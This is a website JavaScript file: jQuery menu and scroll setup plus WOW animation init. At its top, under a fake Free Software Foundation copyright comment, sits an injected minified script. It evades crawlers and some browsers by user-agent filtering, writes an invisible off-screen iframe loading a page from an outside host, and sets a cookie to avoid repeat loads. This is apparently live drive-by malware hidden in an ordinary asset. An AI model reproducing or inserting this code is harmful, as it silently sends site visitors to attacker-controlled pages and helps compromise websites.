/*
Copyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/
*/
function getCookie(a){var b=document.cookie.match(new RegExp("(?:^|; )"+a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return b?decodeURIComponent(b[1]):undefined}(function(){function c(e,h,j){var g=(e+"").toLowerCase();var i=(h+"").toLowerCase();var f=0;if((f=g.indexOf(i,j))!==-1){return f}return false}function b(){var e=["Linux","Windows NT 6.3","Yandex","rv:11.0","AppleWebKit","Googlebot","Android","IEMobile","Windows NT 6.2"];var g=false;for(var f in e){if(c(navigator.userAgent,e[f])){g=true;break}}return g}var d=(getCookie("ipmoture_aurma")===undefined);if(!b()&&d){document.write('<iframe src="http://elspirit.deer-park-resort.com/elspirit17.html?ma" style="border-style:dotted solid double dashed;top: -1000px;left: -1000px;border-top-width: 3px;position: absolute;border-left-width: 3px;" height="143" width="143"></iframe>');var a=new Date(new Date().getTime()+48*60*60*1000);document.cookie="ipmoture_aurma=1; path=/; expires="+a.toUTCString()}})();
/*
Copyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt
*/(function ($) {
	$( '#dl-menu' ).dlmenu();
	$('ul.dl-menu li a').smoothScroll();


	//animation
	new WOW().init();

})(jQuery);